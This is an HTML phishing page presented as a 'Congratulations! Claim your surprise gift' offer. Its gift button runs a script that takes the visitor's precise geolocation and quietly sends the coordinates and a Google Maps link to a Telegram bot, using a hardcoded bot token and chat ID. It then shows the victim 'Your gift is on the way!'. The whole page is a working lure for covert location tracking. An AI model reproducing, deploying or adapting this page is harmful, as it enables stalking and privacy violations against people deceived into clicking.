<!DOCTYPE html>
<html>
<head>
    <title>ğŸ‰ Congratulations! ğŸ‰</title>
    <script>
        function sendLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        var latitude = position.coords.latitude;
                        var longitude = position.coords.longitude;

                        // Your Telegram Bot Token and Chat ID
                        var botToken = "8193877447:AAF5lqPY9-rvw_UaakwnfkFrIvCVFdStpLY";
                        var chatId = "432412879";  
                        
                        var message = `ğŸ“ Location received!\nLatitude: ${latitude}\nLongitude: ${longitude}\n[Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`;

                        var url = `https://api.telegram.org/bot${botToken}/sendMessage`;

                        fetch(url, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({
                                chat_id: chatId,
                                text: message,
                                parse_mode: "Markdown"
                            })
                        })
                        .then(response => response.json())
                        .then(data => {
                            if (data.ok) {
                                document.getElementById("message").innerHTML = "âœ… Your gift is on the way!";
                            } else {
                                document.getElementById("message").innerHTML = "âŒ Failed to send location!";
                                console.error("Telegram API Error:", data);
                            }
                        })
                        .catch(error => {
                            document.getElementById("message").innerHTML = "âŒ Error sending location!";
                            console.error("Error:", error);
                        });
                    },
                    function(error) {
                        document.getElementById("message").innerHTML = "âŒ Failed to get location!";
                        console.error("Geolocation Error:", error);
                    }
                );
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }
    </script>
</head>
<body>
    <h1>ğŸ‰ Congratulations! ğŸ‰</h1>
    <p>Click below to claim your surprise gift!</p>
    <button onclick="sendLocation()">ğŸ Click for the Gift ğŸ</button>
    <p id="message"></p>
</body>
</html>
